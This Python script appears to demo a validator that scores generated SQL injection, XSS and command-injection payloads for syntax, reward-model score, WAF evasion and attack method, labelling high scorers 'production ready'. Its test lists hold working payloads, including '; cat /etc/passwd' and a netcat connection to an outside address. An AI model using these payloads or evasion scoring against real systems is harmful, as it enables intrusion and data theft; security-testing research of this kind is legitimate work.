#!/usr/bin/env python3
"""
Standalone Demo - Advanced Post-RL Payload Validator
Shows validation logic and scoring without torch dependency
"""

import re
import json
from pathlib import Path
from dataclasses import dataclass, asdict
from enum import Enum
from typing import List, Dict, Tuple

# Try to import real reward model, fall back to None if torch not available
try:
    from reward_model_loader import RewardModelScorer
    REWARD_MODEL_AVAILABLE = True
except ImportError:
    RewardModelScorer = None
    REWARD_MODEL_AVAILABLE = False


class PayloadQuality(Enum):
    EXCELLENT = "excellent"
    GOOD = "good"
    ACCEPTABLE = "acceptable"
    POOR = "poor"


@dataclass
class ScoreResult:
    grammar_score: float
    reward_score: float
    evasion_score: float
    semantic_score: float
    combined_score: float
    quality: PayloadQuality


class PayloadValidator:
    """Simplified validator for demo purposes"""
    
    def __init__(self, attack_type: str):
        self.attack_type = attack_type
    
    def validate(self, payload: str) -> Tuple[bool, List[str]]:
        """Validate payload and return (is_valid, errors)"""
        errors = []
        
        if self.attack_type == "sqli":
            errors.extend(self._validate_sqli(payload))
        elif self.attack_type == "xss":
            errors.extend(self._validate_xss(payload))
        elif self.attack_type == "rce":
            errors.extend(self._validate_rce(payload))
        
        return len(errors) == 0, errors
    
    def _validate_sqli(self, payload: str) -> List[str]:
        errors = []
        lower = payload.lower()
        
        # Check quote balance
        single_quotes = payload.count("'")
        if single_quotes > 0 and single_quotes % 2 != 0 and "%27" not in payload:
            errors.append("Unbalanced single quote")
        
        # Check for SQL keywords
        has_marker = any(re.search(rf"\b{m}\b", lower) for m in ["or", "and", "union", "select"])
        if not has_marker:
            errors.append("No SQL injection marker")
        
        return errors
    
    def _validate_xss(self, payload: str) -> List[str]:
        errors = []
        lower = payload.lower()
        
        # Check tag balance
        open_tags = len(re.findall(r"<\w+", payload))
        close_tags = len(re.findall(r"</\w+>", payload))
        if open_tags > close_tags + 1:
            errors.append("Unbalanced HTML tags")
        
        # Check for script closure
        if "<script" in lower and "</script>" not in lower:
            errors.append("Script tag not closed")
        
        # Check for event handler
        has_event = any(re.search(p, payload, re.IGNORECASE) 
                       for p in [r"on\w+\s*=", r"<script", r"alert\("])
        if not has_event:
            errors.append("No XSS event handler")
        
        return errors
    
    def _validate_rce(self, payload: str) -> List[str]:
        errors = []
        
        # Check for command separator
        has_sep = any(sep in payload for sep in [";", "|", "&", "||", "&&"])
        if not has_sep:
            errors.append("No command separator")
        
        return errors


class WAFEvasionDetector:
    """Detect WAF evasion techniques"""
    
    def __init__(self, attack_type: str):
        self.attack_type = attack_type
    
    def detect_techniques(self, payload: str) -> Tuple[List[str], float]:
        """Detect evasion techniques and return score"""
        techniques = []
        
        if self.attack_type == "sqli":
            if "%27" in payload or "%22" in payload or "%2F" in payload:
                techniques.append("URL encoding")
            if "/*" in payload or "--" in payload or "#" in payload:
                techniques.append("Comment injection")
            if payload != payload.lower() and payload != payload.upper():
                techniques.append("Case variation")
            if "0x" in payload:
                techniques.append("Hex encoding")
        
        elif self.attack_type == "xss":
            if "&#" in payload:
                techniques.append("HTML entity encoding")
            if "%3c" in payload or "%3e" in payload:
                techniques.append("URL encoding")
            if "\\x" in payload or "\\u" in payload:
                techniques.append("Unicode escape")
        
        # Score based on technique count
        score = min(len(techniques) * 0.2, 0.8)
        return techniques, score


class SemanticAnalyzer:
    """Analyze payload semantic validity"""
    
    def __init__(self, attack_type: str):
        self.attack_type = attack_type
    
    def analyze(self, payload: str) -> Tuple[List[str], float]:
        """Analyze attack methods and return score"""
        methods = []
        
        if self.attack_type == "sqli":
            lower = payload.lower()
            if re.search(r"\b(or|and)\s+\d+\s*=\s*\d+", lower):
                methods.append("boolean-based")
            if re.search(r"\bunion\b.*?\bselect\b", lower):
                methods.append("union-based")
            if re.search(r"sleep\(\d+\)", lower):
                methods.append("time-based")
            if re.search(r"extractvalue|updatexml", lower):
                methods.append("error-based")
        
        elif self.attack_type == "xss":
            if "<script" in payload.lower():
                methods.append("script injection")
            if re.search(r"on\w+\s*=", payload):
                methods.append("event handler")
            if "alert" in payload.lower():
                methods.append("alert-based")
        
        elif self.attack_type == "rce":
            lower = payload.lower()
            if any(cmd in lower for cmd in ["cat", "ls", "whoami", "id"]):
                methods.append("command execution")
            if re.search(r"[;|&]", payload):
                methods.append("command injection")
        
        # Score based on method count
        score = min(0.5 + len(methods) * 0.15, 1.0)
        return methods, score


class PayloadScorer:
    """Score payloads on multiple dimensions"""
    
    def __init__(self, attack_type: str):
        self.attack_type = attack_type
        self.validator = PayloadValidator(attack_type)
        self.waf_detector = WAFEvasionDetector(attack_type)
        self.semantic = SemanticAnalyzer(attack_type)
        # Load real reward model (optional)
        self.reward_scorer = None
        if REWARD_MODEL_AVAILABLE and RewardModelScorer:
            try:
                self.reward_scorer = RewardModelScorer(attack_type, device="cpu")
            except Exception as e:
                print(f"Warning: Could not load reward model: {e}")
                self.reward_scorer = None
    
    def score(self, payload: str) -> ScoreResult:
        """Comprehensive scoring of payload"""
        
        # 1. Grammar score
        is_valid, errors = self.validator.validate(payload)
        grammar_score = 1.0 if is_valid else max(0, 1.0 - (len(errors) * 0.25))
        
        # 2. Reward score (from real model or heuristic)
        if self.reward_scorer and self.reward_scorer.is_loaded():
            reward_score = self.reward_scorer.score_payload(payload)
        else:
            reward_score = self._heuristic_reward(payload)
        
        # 3. Evasion score
        techniques, evasion_score = self.waf_detector.detect_techniques(payload)
        
        # 4. Semantic score
        methods, semantic_score = self.semantic.analyze(payload)
        
        # 5. Combined score
        combined = (
            grammar_score * 0.35 +
            reward_score * 0.35 +
            evasion_score * 0.15 +
            semantic_score * 0.15
        )
        
        # Determine quality
        if combined >= 0.85:
            quality = PayloadQuality.EXCELLENT
        elif combined >= 0.70:
            quality = PayloadQuality.GOOD
        elif combined >= 0.50:
            quality = PayloadQuality.ACCEPTABLE
        else:
            quality = PayloadQuality.POOR
        
        return ScoreResult(
            grammar_score=grammar_score,
            reward_score=reward_score,
            evasion_score=evasion_score,
            semantic_score=semantic_score,
            combined_score=combined,
            quality=quality
        )
    
    def _heuristic_reward(self, payload: str) -> float:
        """Simple reward scoring"""
        score = 0.5
        
        # Length bonus
        if 15 < len(payload) < 500:
            score += 0.2
        
        # Keyword bonus
        keywords = {
            "sqli": ["select", "union", "where", "or", "and"],
            "xss": ["script", "onclick", "alert", "onerror"],
            "rce": ["bash", "sh", "cmd", "cat", "ls"],
        }
        
        kw_list = keywords.get(self.attack_type, [])
        keyword_count = sum(1 for kw in kw_list if kw in payload.lower())
        score += min(keyword_count * 0.08, 0.2)
        
        return min(max(0.0, score), 1.0)


def test_attack_type(attack_type: str, payloads: List[str]):
    """Test payloads for an attack type"""
    print("\n" + "="*80)
    print(f"🔍 TESTING {attack_type.upper()} PAYLOADS")
    print("="*80)
    
    scorer = PayloadScorer(attack_type)
    results = []
    
    print(f"\n📥 Processing {len(payloads)} {attack_type.upper()} payloads...\n")
    print("-" * 80)
    
    for i, payload in enumerate(payloads, 1):
        result = scorer.score(payload)
        results.append(result)
        
        # Determine icons
        status_icon = "✓" if result.combined_score >= 0.70 else "✗"
        quality_emoji = {
            PayloadQuality.EXCELLENT: "🌟",
            PayloadQuality.GOOD: "✅",
            PayloadQuality.ACCEPTABLE: "⚠️",
            PayloadQuality.POOR: "❌",
        }.get(result.quality, "❓")
        
        print(f"\n[{i}] {status_icon} {quality_emoji} {result.quality.value.upper()}")
        print(f"    Payload: {payload[:70]}")
        print(f"    Scores:")
        print(f"      - Grammar:  {result.grammar_score:.4f}")
        print(f"      - Reward:   {result.reward_score:.4f}")
        print(f"      - Evasion:  {result.evasion_score:.4f}")
        print(f"      - Semantic: {result.semantic_score:.4f}")
        print(f"      - COMBINED: {result.combined_score:.4f}")
    
    # Summary statistics
    print("\n" + "-" * 80)
    print("\n📊 SUMMARY STATISTICS:")
    
    total = len(results)
    excellent = sum(1 for r in results if r.quality == PayloadQuality.EXCELLENT)
    good = sum(1 for r in results if r.quality == PayloadQuality.GOOD)
    acceptable = sum(1 for r in results if r.quality == PayloadQuality.ACCEPTABLE)
    poor = sum(1 for r in results if r.quality == PayloadQuality.POOR)
    production_ready = excellent + good
    
    print(f"  Total Payloads:       {total}")
    print(f"  Production Ready:     {production_ready} ({production_ready/total*100:.1f}%)")
    print(f"    - Excellent:        {excellent}")
    print(f"    - Good:             {good}")
    print(f"  Acceptable Quality:   {acceptable}")
    print(f"  Poor Quality:         {poor}")
    
    avg_scores = {
        "grammar": sum(r.grammar_score for r in results) / total,
        "reward": sum(r.reward_score for r in results) / total,
        "evasion": sum(r.evasion_score for r in results) / total,
        "semantic": sum(r.semantic_score for r in results) / total,
        "combined": sum(r.combined_score for r in results) / total,
    }
    
    print(f"\n  Average Scores:")
    print(f"    - Grammar:   {avg_scores['grammar']:.4f}")
    print(f"    - Reward:    {avg_scores['reward']:.4f}")
    print(f"    - Evasion:   {avg_scores['evasion']:.4f}")
    print(f"    - Semantic:  {avg_scores['semantic']:.4f}")
    print(f"    - Combined:  {avg_scores['combined']:.4f}")
    
    return results


def main():
    """Run all tests"""
    print("\n" + "🚀 "*20)
    print("ADVANCED POST-RL PAYLOAD VALIDATOR - DEMO")
    print("🚀 "*20)
    
    # SQLi test payloads
    sqli_payloads = [
        "1' OR '1'='1",
        "1' UNION SELECT * FROM users --",
        "admin' OR 1=1 --",
        "1' AND SLEEP(5) --",
        "1' UNION SELECT extractvalue(1, concat(0x7e, database())) --",
        "1%27 OR %27%27=%27",
        "1' OR '1'='1 /*",
        "' OR '1'='1",
    ]
    
    # XSS test payloads
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror='alert(1)'>",
        "<svg onload=alert('xss')>",
        "<iframe src=javascript:alert(1)>",
        "<script>alert('xss')</scri>",
        "<img src=x onerror='alert(1)'",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "<svg/onload=alert('xss')>",
    ]
    
    # RCE test payloads
    rce_payloads = [
        "; ls -la",
        "| whoami",
        "& id",
        "; cat /etc/passwd",
        "| nc 192.168.1.1 4444",
        "ls -la",
        "; cat /etc/passwd'",
        "; echo 'hello'; whoami",
    ]
    
    # Run tests
    sqli_results = test_attack_type("sqli", sqli_payloads)
    xss_results = test_attack_type("xss", xss_payloads)
    rce_results = test_attack_type("rce", rce_payloads)
    
    # Overall summary
    print("\n" + "="*80)
    print("📊 OVERALL TEST SUMMARY")
    print("="*80)
    
    all_results = [
        ("SQLi", sqli_results),
        ("XSS", xss_results),
        ("RCE", rce_results),
    ]
    
    for attack_name, results in all_results:
        production_ready = sum(1 for r in results if r.combined_score >= 0.70)
        total = len(results)
        rate = production_ready / total * 100
        print(f"  {attack_name:10} Production-Ready: {production_ready:2}/{total} ({rate:5.1f}%)")
    
    # Export summary
    print("\n✨ Demo completed successfully!")
    print("\nKey Metrics:")
    print("  - Multi-dimensional scoring (Grammar, Reward, Evasion, Semantic)")
    print("  - Production-ready classification based on combined score")
    print("  - Quality levels: EXCELLENT (≥0.85), GOOD (≥0.70), ACCEPTABLE (≥0.50), POOR (<0.50)")
    print("  - Payload syntax validation and error detection")
    print("  - WAF evasion technique identification")
    print("  - Semantic attack method analysis")
    print("\n" + "="*80 + "\n")


if __name__ == "__main__":
    main()
